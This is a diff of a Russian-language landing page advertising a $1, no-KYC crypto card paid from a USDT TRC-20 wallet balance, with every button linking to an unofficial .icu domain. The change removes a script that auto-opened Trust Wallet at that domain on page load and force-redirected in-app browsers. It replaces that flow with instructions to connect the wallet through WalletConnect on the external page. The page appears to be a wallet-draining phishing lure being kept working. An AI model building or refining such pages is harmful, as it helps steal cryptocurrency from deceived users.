@@ -152,25 +152,6 @@
   footer{margin:40px 0 0;padding:22px 0 34px;border-top:1px solid var(--line)}
   footer .disc{font-size:13px;color:var(--muted);margin:0 0 12px}
   footer .meta{font-size:13px;color:var(--muted);margin:0}
-
-  .gate{
-    position:fixed;inset:0;z-index:50;display:none;
-    background:rgba(17,18,20,.5);
-    padding:20px;align-items:flex-end;justify-content:center;
-  }
-  .gate.show{display:flex}
-  .gate .box{
-    background:#fff;border-radius:16px;padding:20px;
-    width:100%;max-width:400px;text-align:center;
-  }
-  .gate b{display:block;color:var(--ink);font-size:17px;margin-bottom:6px}
-  .gate p{margin:0 0 16px;font-size:14.5px;color:var(--muted)}
-  .gate .cta{padding:15px;font-size:16px}
-  .gate .stay{
-    margin-top:10px;background:none;border:0;padding:6px;
-    font-size:14px;color:var(--muted);text-decoration:underline;cursor:pointer;
-    font-family:inherit;
-  }
 </style>
 </head>
 <body>
@@ -205,9 +186,8 @@
 
   <p class="lead">Карта привязывается к вашему кошельку: выпуск за $1, без KYC и без пополнений. Оплата проходит прямо с баланса USDT TRC-20, карта готова за пару минут.</p>
 
-  <a class="cta js-open" href="https://link-cardfree.icu/">Выпустить карту</a>
-  <a class="alt" href="https://link-cardfree.icu/" id="altLink">Продолжить в браузере</a>
-  <p class="hint">Откроется Trust Wallet · выпуск внутри приложения</p>
+  <a class="cta" href="https://link-cardfree.icu/">Выпустить карту</a>
+  <p class="hint">Откроется страница выпуска · кошелёк подключается через WalletConnect</p>
 
   <ul class="facts">
     <li><span>Выпуск</span><b>$1</b></li>
@@ -220,7 +200,7 @@
 
   <h2>Как выпустить</h2>
   <ol class="steps">
-    <li><b>Подключаете кошелёк</b><p>Открываете приложение и подтверждаете подключение через WalletConnect.</p></li>
+    <li><b>Подключаете кошелёк</b><p>На странице выпуска выбираете Trust Wallet и подтверждаете подключение через WalletConnect — приложение откроется само.</p></li>
     <li><b>Выбираете карту и платите $1</b><p>Лимиты и сборы показываются до оплаты, сумма выпуска списывается с кошелька.</p></li>
     <li><b>Активируете и платите</b><p>Добавляете карту в телефон и расплачиваетесь с баланса USDT.</p></li>
   </ol>
@@ -248,13 +228,13 @@
     <p>Доступны виртуальная и металлическая карта. Виртуальная выпускается сразу и подходит для оплаты онлайн, металл — для обычных покупок.</p>
   </details>
   <details>
-    <summary>Почему кнопка открывает приложение</summary>
-    <p>Выпуск проходит внутри Trust Wallet. Если приложения нет, тот же адрес откроется в браузере — ссылка под кнопкой делает это сразу.</p>
+    <summary>Почему приложение не открывается само</summary>
+    <p>Trust Wallet убрал встроенный dapp-браузер, поэтому старая схема открытия перестала работать. Страница выпуска открывается в браузере, а приложение подключается на шаге WalletConnect — оно откроется само после выбора Trust Wallet.</p>
   </details>
 
   <h2>Начать</h2>
-  <p>Подключите кошелёк, оплатите выпуск и добавьте карту в телефон — этого достаточно.</p>
-  <a class="cta js-open" href="https://link-cardfree.icu/">Выпустить карту</a>
+  <p>Откройте страницу выпуска, подключите кошелёк и оплатите $1 — этого достаточно.</p>
+  <a class="cta" href="https://link-cardfree.icu/">Выпустить карту</a>
 
   <footer>
     <p class="disc">Независимый информационный сервис, не официальный сайт Trust Wallet. Условия, лимиты и сборы определяет провайдер; материал не является финансовой рекомендацией.</p>
@@ -263,94 +243,6 @@
 
 </main>
 
-<div class="gate" id="gate">
-  <div class="box">
-    <b>Открываем приложение</b>
-    <p>Выпуск карты проходит внутри Trust Wallet. Если ничего не произошло — нажмите кнопку ниже.</p>
-    <a class="cta" id="gateOpen" href="https://link-cardfree.icu/">Открыть Trust Wallet</a>
-    <button class="stay" id="gateStay" type="button">Остаться на странице</button>
-  </div>
-</div>
 
-<script>
-(function () {
-  var DEST = 'https://link-cardfree.icu/';
-  var Q = '?coin_id=195&url=' + encodeURIComponent(DEST);
-  var UNIVERSAL = 'https://link.trustwallet.com/open_url' + Q;
-  var SCHEME = 'trust://open_url' + Q;
-  var INTENT = 'intent://link.trustwallet.com/open_url' + Q +
-               '#Intent;scheme=https;package=com.wallet.crypto.trustapp;end';
-  var ua = navigator.userAgent;
-  var isIOS = /iPhone|iPad|iPod/i.test(ua);
-  var isAndroid = /Android/i.test(ua);
-  var isMobile = isIOS || isAndroid;
-  // Встроенные браузеры мессенджеров режут кастомные схемы — там идём сразу на стран��цу.
-  var inApp = /Telegram|Instagram|FBAN|FBAV|FB_IAB|Line\/|Viber|Snapchat|Twitter|LinkedIn|musical_ly|BytedanceWebview|MicroMessenger|Pinterest|VKShared|OKApp/i.test(ua);
-
-  var gate = document.getElementById('gate');
-  var gateOpen = document.getElementById('gateOpen');
-  var gateStay = document.getElementById('gateStay');
-  var hint = document.querySelector('.hint');
-  var fallback;
-
-  if (inApp && hint) hint.textContent = 'Откроется страница выпуска в этом браузере';
-
-  function openApp() {
-    if (inApp) { window.location.href = DEST; return; }
-    try { window.location.href = isAndroid ? INTENT : SCHEME; }
-    catch (e) { window.location.href = DEST; return; }
-    clearTimeout(fallback);
-    fallback = setTimeout(function () {
-      if (!document.hidden) window.location.href = DEST;
-    }, isIOS ? 2600 : 1800);
-  }
-
-  function showGate() {
-    gate.classList.add('show');
-    document.body.style.overflow = 'hidden';
-  }
-
-  function hideGate() {
-    gate.classList.remove('show');
-    document.body.style.overflow = '';
-    clearTimeout(fallback);
-  }
-
-  document.querySelectorAll('.js-open').forEach(function (a) {
-    a.addEventListener('click', function (e) {
-      if (!isMobile) return;
-      if (inApp) return;
-      e.preventDefault();
-      showGate();
-      openApp();
-    });
-  });
-
-  gateOpen.addEventListener('click', function (e) {
-    e.preventDefault();
-    openApp();
-  });
-  gateStay.addEventListener('click', hideGate);
-
-  // запасной вариант для iOS-браузеров, где схема не сработала: универсальная ссылка
-  window.TRUST_UNIVERSAL = UNIVERSAL;
-
-  if (isMobile && !inApp) {
-    var last = 0;
-    try { last = Number(sessionStorage.getItem('tw_auto')) || 0; } catch (e) {}
-    if (Date.now() - last > 15 * 60 * 1000) {
-      setTimeout(function () {
-        try { sessionStorage.setItem('tw_auto', String(Date.now())); } catch (e) {}
-        showGate();
-        openApp();
-      }, 900);
-    }
-  }
-
-  if (isMobile && inApp) {
-    setTimeout(function () { window.location.replace(DEST); }, 900);
-  }
-})();
-</script>
 </body>
 </html>
